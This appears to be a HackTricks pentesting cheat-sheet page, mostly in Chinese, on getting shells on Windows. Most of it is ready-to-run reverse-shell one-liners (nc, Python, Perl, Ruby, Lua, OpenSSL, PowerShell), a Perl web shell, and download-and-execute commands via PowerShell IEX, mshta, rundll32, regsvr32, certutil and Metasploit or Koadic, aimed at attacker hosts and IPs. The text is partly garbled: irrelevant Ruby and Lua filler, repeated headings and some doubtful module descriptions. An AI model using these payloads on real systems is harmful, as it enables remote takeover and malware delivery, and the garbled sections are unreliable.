# Shells - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告** 吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便您可以更快地修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从 API 到 Web 应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

页面 [lolbas-project.github.io](https://lolbas-project.github.io/) 是为 Windows 设计的，就像 [https://gtfobins.github.io/](https://gtfobins.github.io/) 是为 Linux 设计的。\
显然，在 Windows 中**没有 SUID 文件或 sudo 权限**，但了解一些**二进制文件**如何被（滥）用以执行某种意外操作是很有用的。

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** 是一个 Netcat 克隆版本，旨在提供强大的加密功能并具有可移植性。它可以在类Unix操作系统和Microsoft Win32上运行。sbd支持AES-CBC-128 + HMAC-SHA1加密（由Christophe Devine提供），支持程序执行（-e选项），选择源端口，延迟连续重连以及其他一些不错的功能。sbd仅支持TCP/IP通信。sbd.exe（Kali Linux发行版的一部分：/usr/share/windows-resources/sbd/sbd.exe）可以作为Netcat的替代品上传到Windows系统中。

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl是一种通用的脚本编程语言，广泛用于网络和系统管理任务。它具有强大的文本处理能力和灵活的语法，使其成为渗透测试中常用的工具之一。

### Perl反向Shell

Perl反向Shell是一种利用Perl编写的恶意脚本，用于建立与目标系统的反向连接。它允许攻击者通过网络与受感染的系统进行交互，并执行各种操作，如文件操作、系统命令执行等。

以下是一个示例Perl反向Shell脚本：

```perl
use Socket;
use FileHandle;

$host = "攻击者IP";
$port = 攻击者端口;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "无法创建套接字: $!";
connect(SOCKET, sockaddr_in($port, inet_aton($host))) or die "无法连接到主机: $!";

open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system("/bin/sh -i");
close(STDIN);
close(STDOUT);
close(STDERR);
```

请将上述示例脚本中的`攻击者IP`和`攻击者端口`替换为实际的IP地址和端口。

要使用Perl反向Shell，您需要在目标系统上运行该脚本。一旦成功建立反向连接，您将能够远程控制目标系统并执行所需的操作。

### Perl Web Shell

Perl Web Shell是一种基于Perl编写的Web应用程序，用于在目标Web服务器上执行命令和操作。它通常通过Web应用程序的漏洞或弱密码进行部署。

以下是一个示例Perl Web Shell脚本：

```perl
#!/usr/bin/perl

use CGI qw(:standard);
print header;
print start_html("Perl Web Shell");

if (param()) {
    $cmd = param('cmd');
    print "<pre>";
    system($cmd);
    print "</pre>";
}

print "<form method='POST'>";
print "<input type='text' name='cmd'>";
print "<input type='submit' value='执行'>";
print "</form>";

print end_html;
```

要使用Perl Web Shell，您需要将上述脚本上传到目标Web服务器，并通过浏览器访问该脚本的URL。然后，您可以在Web界面上输入命令并执行它们。

请注意，使用Perl反向Shell和Perl Web Shell进行未经授权的访问或攻击是非法的。这些工具仅用于合法的渗透测试和安全审计目的。
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby是一种动态、面向对象的编程语言，常用于Web开发。它具有简洁的语法和强大的功能，被广泛用于构建各种应用程序。

### Ruby的特点

- 简洁：Ruby的语法简单明了，易于阅读和编写。
- 动态：Ruby是一种动态语言，可以在运行时修改和扩展代码。
- 面向对象：Ruby支持面向对象编程，允许开发者使用类、对象和继承等概念。
- 强大的元编程能力：Ruby具有强大的元编程能力，可以在运行时修改和扩展类和对象的行为。
- 丰富的标准库：Ruby拥有丰富的标准库，提供了许多常用的功能和工具。

### Ruby的应用领域

由于Ruby具有简洁、灵活和强大的特性，它在许多领域得到了广泛应用，包括：

- Web开发：Ruby on Rails是一种基于Ruby的Web开发框架，被广泛用于构建高效、可扩展的Web应用程序。
- 脚本编程：Ruby可以用于编写各种脚本，包括自动化任务、数据处理和系统管理等。
- 游戏开发：Ruby可以用于开发各种类型的游戏，包括桌面游戏和移动游戏。
- 数据分析：Ruby提供了丰富的数据处理和分析库，可以用于处理和分析大量数据。
- 服务器管理：Ruby可以用于编写服务器管理脚本，简化服务器配置和管理的过程。

### Ruby的学习资源

学习Ruby的最佳途径是通过阅读官方文档和参考书籍，同时结合实践进行学习。以下是一些学习Ruby的资源：

- [Ruby官方文档](https://www.ruby-lang.org/zh_cn/documentation/)
- [Ruby编程语言](https://book.douban.com/subject/26374895/)
- [Ruby on Rails教程](https://railstutorial-china.org/book/)
- [Ruby编程入门经典](https://book.douban.com/subject/25881125/)

通过学习和实践，你可以掌握Ruby的基本语法和常用技巧，进而开发出高效、可靠的应用程序。
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua是一种轻量级的、高效的脚本语言，广泛用于嵌入式系统和游戏开发中。它具有简单的语法和强大的扩展性，可以通过C语言进行扩展。Lua脚本可以在Windows操作系统上运行，并且可以通过各种方式进行执行和调试。

### Lua脚本执行

在Windows系统上执行Lua脚本有多种方法：

1. **命令行执行**：可以使用命令行工具运行Lua脚本。在命令提示符下，输入`lua`命令，然后加上脚本文件的路径，即可执行脚本。

2. **交互式执行**：可以使用交互式的Lua解释器执行Lua脚本。在命令提示符下，输入`lua`命令，然后直接输入Lua代码，即可执行。

3. **集成开发环境（IDE）**：可以使用集成开发环境（IDE）来执行Lua脚本。一些常用的IDE，如ZeroBrane Studio和Lua Development Tools，提供了方便的编辑、执行和调试Lua脚本的功能。

### Lua脚本调试

在Windows系统上调试Lua脚本有多种方式：

1. **print函数调试**：可以在Lua脚本中使用print函数输出调试信息。通过在关键位置插入print语句，可以查看变量的值和程序的执行流程。

2. **调试器调试**：可以使用调试器来调试Lua脚本。一些常用的调试器，如ZeroBrane Studio和Lua Development Tools，提供了调试功能，可以设置断点、单步执行、查看变量值等。

3. **日志调试**：可以在Lua脚本中使用日志记录调试信息。通过在关键位置插入日志记录语句，可以将调试信息输出到日志文件中，以便后续分析。

### Lua脚本扩展

Lua脚本可以通过C语言进行扩展，以满足特定需求。可以使用Lua的C API来编写扩展模块，然后将其编译为动态链接库（DLL），供Lua脚本调用。

扩展模块可以提供额外的功能和性能优化，例如访问操作系统API、处理二进制数据、实现高性能算法等。

### 总结

Lua是一种轻量级的、高效的脚本语言，适用于嵌入式系统和游戏开发。在Windows系统上，可以通过命令行执行、交互式执行或使用集成开发环境来执行Lua脚本。调试Lua脚本可以使用print函数、调试器或日志记录。通过C语言扩展，可以为Lua脚本提供额外的功能和性能优化。
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

攻击者（Kali）
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
受害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell是一种强大的脚本语言和命令行工具，广泛用于Windows系统上的自动化任务和系统管理。它提供了许多功能强大的命令和脚本，可以帮助黑客在渗透测试和攻击中实现各种目标。

### Powershell反向Shell

Powershell反向Shell是一种常用的攻击技术，用于在目标系统上建立与攻击者控制的远程服务器之间的连接。这种连接允许黑客执行各种操作，如文件上传和下载、命令执行以及系统控制。

要创建Powershell反向Shell，黑客需要在目标系统上运行一个恶意的Powershell脚本，该脚本将与攻击者的服务器建立连接。一旦连接建立，黑客就可以通过该连接执行各种命令和操作。

### Powershell下载器

Powershell下载器是一种常见的攻击工具，用于在目标系统上下载和执行恶意软件。黑客可以使用Powershell下载器来绕过传统的安全防护措施，如防火墙和杀毒软件。

Powershell下载器通常通过恶意的Powershell脚本实现。这些脚本会从远程服务器下载恶意软件，并在目标系统上执行。通过使用Powershell下载器，黑客可以轻松地在目标系统上部署和执行各种恶意软件，如间谍软件、勒索软件和远程访问工具。

### Powershell后门

Powershell后门是一种隐藏在目标系统上的恶意程序，用于在未被授权的情况下访问和控制系统。Powershell后门通常通过恶意的Powershell脚本或可执行文件实现。

一旦Powershell后门成功安装在目标系统上，黑客就可以使用它来执行各种操作，如文件操作、命令执行和系统控制。Powershell后门通常具有隐蔽性强、功能强大和难以检测的特点，使黑客能够长期潜伏在目标系统中。

### Powershell攻击框架

Powershell攻击框架是一种集成了多种攻击技术和工具的平台，用于在目标系统上执行各种攻击。这些攻击技术包括反向Shell、下载器、后门等。

Powershell攻击框架通常由多个Powershell脚本组成，每个脚本负责执行特定的攻击任务。黑客可以使用Powershell攻击框架来自动化攻击过程，提高攻击效率和成功率。

### Powershell安全

由于Powershell的强大功能和广泛应用，它也成为了黑客攻击的目标。为了保护系统免受Powershell攻击，以下是一些常见的安全措施：

- 限制Powershell脚本的执行权限，只允许受信任的脚本运行。
- 定期更新系统和Powershell版本，以修复已知的安全漏洞。
- 使用安全防护工具，如防火墙和杀毒软件，来检测和阻止恶意的Powershell脚本。
- 加强对系统的监控和日志记录，及时发现和应对Powershell攻击。

通过采取这些安全措施，可以有效减少系统受到Powershell攻击的风险。
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
执行网络调用的进程：**powershell.exe**\
写入磁盘的有效载荷：**否**（至少在我使用 procmon 时没有找到！）
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

**一行简述：**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## Mshta

Mshta是Windows操作系统中的一个实用程序，它允许用户执行HTML应用程序。它可以用于执行恶意代码，因为它可以绕过一些安全限制并在系统上执行任意命令。

### 使用Mshta进行远程代码执行

要使用Mshta进行远程代码执行，可以创建一个.hta文件，其中包含恶意代码。然后，可以使用以下命令执行.hta文件：

```plaintext
mshta <URL>
```

其中，`<URL>`是包含恶意代码的.hta文件的URL。

### 示例

以下是一个使用Mshta进行远程代码执行的示例：

```plaintext
mshta http://evil.com/malicious.hta
```

在此示例中，恶意.hta文件位于`http://evil.com/malicious.hta`，当执行上述命令时，恶意代码将在受害者系统上执行。

### 防御措施

要防止Mshta被滥用，可以采取以下措施：

- 禁用或限制Mshta的执行权限。
- 定期更新操作系统和应用程序以修补已知的漏洞。
- 使用可信任的安全软件来检测和阻止恶意代码的执行。
- 教育用户有关潜在的网络威胁和安全最佳实践。

## 更多关于不同Powershell Shell的信息

请参阅本文档末尾的附录，了解有关不同Powershell Shell的更多信息。
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
执行网络调用的进程：**mshta.exe**\
写入磁盘的载荷：**IE 本地缓存**
```bash
mshta http://webserver/payload.hta
```
执行网络调用的进程：**mshta.exe**\
写入磁盘的载荷：**IE 本地缓存**
```bash
mshta \\webdavserver\folder\payload.hta
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

#### **hta-psh反向shell示例（使用hta下载并执行PS后门）**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**您可以使用stager hta非常容易地下载并执行Koadic僵尸**

#### hta示例
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

#### **mshta - sct**

The `mshta - sct` technique is a method of executing malicious code on a Windows system using the `mshta` utility and a scriptlet file (`sct`). This technique leverages the `mshta` utility, which is a legitimate Windows component used to execute HTML applications (`hta` files). By combining `mshta` with a scriptlet file, an attacker can execute arbitrary code on a target system.

To use this technique, an attacker typically creates a scriptlet file (`sct`) that contains the malicious code they want to execute. The scriptlet file can be hosted on a remote server or delivered to the target system through other means, such as email attachments or malicious downloads. The attacker then uses the `mshta` utility to execute the scriptlet file, which in turn executes the malicious code.

The `mshta - sct` technique can be used to bypass security measures that may block or detect other types of malicious files, such as executable files (`exe`) or script files (`vbs`, `bat`). Since `mshta` is a legitimate Windows component, it is less likely to be blocked or flagged by security software.

To execute a scriptlet file using `mshta`, the following command can be used:

```
mshta.exe <URL to scriptlet file>
```

The `mshta` utility will download and execute the scriptlet file, which can contain any type of code, including JavaScript, VBScript, or PowerShell. This allows an attacker to perform a wide range of malicious activities, such as downloading and executing additional malware, stealing sensitive information, or gaining unauthorized access to the system.

It is important to note that the `mshta - sct` technique relies on social engineering to trick users into executing the malicious scriptlet file. Attackers may use various tactics, such as disguising the file as a legitimate document or enticing users to click on a malicious link.

To protect against this technique, users should exercise caution when opening email attachments or clicking on links, especially if they come from unknown or suspicious sources. Additionally, organizations should implement security measures, such as email filtering and endpoint protection, to detect and block malicious files and URLs.

Overall, the `mshta - sct` technique is a powerful method for executing malicious code on a Windows system, bypassing traditional security measures. By understanding how this technique works, users and organizations can better protect themselves against such attacks.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

#### **Mshta - Metasploit**

Mshta is a Microsoft HTML Application Host that allows you to execute HTML applications (.hta files) on Windows. It is a legitimate Windows component that can be abused by attackers to execute malicious code.

Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that allows you to exploit the Mshta vulnerability.

To use this module, you need to set the `SRVHOST`, `SRVPORT`, and `URIPATH` options. The `SRVHOST` and `SRVPORT` options specify the IP address and port number of the Metasploit server, while the `URIPATH` option specifies the path of the malicious HTA file.

Once the options are set, you can run the exploit by executing the `exploit` command. This will start the Metasploit server and serve the malicious HTA file. When the target user opens the HTA file, the payload will be executed on their system.

It is important to note that using this module requires the target user to have Internet Explorer installed and the "mshta.exe" file associated with the ".hta" file extension.

#### **Mshta - Metasploit**

Mshta是Microsoft HTML应用程序宿主，允许您在Windows上执行HTML应用程序（.hta文件）。它是一个合法的Windows组件，攻击者可以滥用它来执行恶意代码。

Metasploit是一个流行的渗透测试框架，提供了一个名为`exploit/windows/browser/mshta`的模块，允许您利用Mshta漏洞。

要使用此模块，您需要设置`SRVHOST`，`SRVPORT`和`URIPATH`选项。`SRVHOST`和`SRVPORT`选项指定Metasploit服务器的IP地址和端口号，而`URIPATH`选项指定恶意HTA文件的路径。

设置选项后，可以通过执行`exploit`命令来运行利用程序。这将启动Metasploit服务器并提供恶意HTA文件。当目标用户打开HTA文件时，负载将在其系统上执行。

需要注意的是，使用此模块需要目标用户安装Internet Explorer，并将"mshta.exe"文件与".hta"文件扩展名关联起来。
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**被防御者检测到**

## **Rundll32**

[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
执行网络调用的进程：**rundll32.exe**\
写入磁盘的有效载荷：**IE 本地缓存**

**被防御者检测到**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL (Dynamic Link Library) functions. Metasploit, a popular penetration testing framework, provides a module called `windows/local/execute` that leverages Rundll32 to execute malicious DLLs on a target system.

To use this module, follow these steps:

1. Generate a malicious DLL payload using the `msfvenom` tool. For example, to create a reverse shell payload:

   ```
   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
   ```

   Replace `<attacker IP>` and `<attacker port>` with your own IP address and port.

2. Start a Metasploit listener to receive the reverse shell connection:

   ```
   use exploit/multi/handler
   set payload windows/shell_reverse_tcp
   set LHOST <attacker IP>
   set LPORT <attacker port>
   exploit
   ```

   Replace `<attacker IP>` and `<attacker port>` with your own IP address and port.

3. Upload the generated `payload.dll` to the target system.

4. Use the `rundll32` command to execute the malicious DLL:

   ```
   rundll32 payload.dll, <function name>
   ```

   Replace `<function name>` with the name of the exported function in the DLL.

   The target system will establish a reverse shell connection to the attacker's machine, providing the attacker with remote access and control over the target system.

Note: This technique may trigger antivirus alerts, so it is important to use it responsibly and only in controlled environments.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files. Koadic is a post-exploitation tool that leverages the Rundll32 utility to load malicious DLLs and execute commands on a compromised system.

To use Koadic, first, you need to generate a malicious DLL payload using the Koadic framework. This payload can be customized to perform various actions, such as establishing a reverse shell or executing arbitrary commands.

Once the payload is generated, you can use the Rundll32 utility to load the DLL and execute the desired commands. The syntax for executing a DLL using Rundll32 is as follows:

```
rundll32.exe <path_to_malicious_dll>,<entry_point>
```

The `<path_to_malicious_dll>` should be the path to the generated DLL payload, and `<entry_point>` should be the name of the exported function within the DLL that you want to execute.

By leveraging Rundll32 and Koadic, an attacker can execute commands on a compromised system without the need for a separate executable. This technique can be useful for maintaining persistence, evading detection, and performing various post-exploitation activities.

It is important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security vulnerabilities and to promote responsible and ethical hacking practices.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32是Windows操作系统中的一个命令行实用程序，用于注册和注销动态链接库（DLL）文件。它可以用于执行各种操作，包括注册DLL文件、注销DLL文件、查看已注册的DLL文件等。

### 注册DLL文件

要注册DLL文件，可以使用以下命令：

```shell
regsvr32 <DLL文件路径>
```

例如，要注册名为example.dll的DLL文件，可以使用以下命令：

```shell
regsvr32 C:\path\to\example.dll
```

### 注销DLL文件

要注销已注册的DLL文件，可以使用以下命令：

```shell
regsvr32 /u <DLL文件路径>
```

例如，要注销名为example.dll的DLL文件，可以使用以下命令：

```shell
regsvr32 /u C:\path\to\example.dll
```

### 查看已注册的DLL文件

要查看已注册的DLL文件，可以使用以下命令：

```shell
regsvr32 /s <DLL文件路径>
```

例如，要查看名为example.dll的DLL文件是否已注册，可以使用以下命令：

```shell
regsvr32 /s C:\path\to\example.dll
```

以上是使用Regsvr32命令行实用程序在Windows操作系统中注册、注销和查看DLL文件的方法。
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
执行网络调用的进程：**regsvr32.exe**\
写入磁盘的载荷：**IE 本地缓存**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

**被Defender检测到**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLLs (Dynamic Link Libraries) and ActiveX controls in the Windows Registry. This utility can also be used to execute arbitrary code on a target system.

Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It can be used to exploit vulnerabilities in various systems and gain unauthorized access.

By combining the functionality of Regsvr32 with the capabilities of Metasploit, an attacker can register a malicious DLL or ActiveX control on a target system and execute arbitrary code with the privileges of the user running the Regsvr32 command.

To use Regsvr32 with Metasploit, follow these steps:

1. Generate a malicious DLL or ActiveX control using Metasploit's payload generator.
2. Transfer the generated payload to the target system.
3. Open a command prompt on the target system.
4. Use the following command to register the malicious DLL or ActiveX control:

```
regsvr32 /s /n /u /i:http://<attacker_ip>:<attacker_port>/payload.sct scrobj.dll
```

Replace `<attacker_ip>` and `<attacker_port>` with the IP address and port of the system running the Metasploit listener.

5. Once the DLL or ActiveX control is registered, it will be executed automatically when certain conditions are met (e.g., opening a specific file type or visiting a website).

This technique can be used to gain remote access to a target system and perform various malicious activities, such as stealing sensitive information, installing backdoors, or launching further attacks.

It is important to note that using this technique without proper authorization is illegal and unethical. It should only be used for legitimate purposes, such as penetration testing or authorized security assessments.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**您可以使用stager regsvr轻松下载并执行Koadic僵尸**

## Certutil

下载一个B64dll文件，解码并执行它。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
下载一个B64exe文件，解码并执行它。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**被防御者检测到**

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

查找最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm\_campaign=hacktricks&utm\_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft for running scripts written in VBScript or JScript. It is commonly used for administrative tasks and automation on Windows systems.

Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It is widely used by security professionals for testing the security of computer systems.

When it comes to exploiting Windows systems using Metasploit, Cscript can be a useful tool. By leveraging Cscript, you can execute VBScript or JScript payloads on a target Windows machine.

To use Cscript with Metasploit, you can create a payload using the `msfvenom` tool and specify the output format as `vbs` or `js`. This will generate a script that can be executed using Cscript.

Here's an example of generating a VBScript payload using `msfvenom`:

```
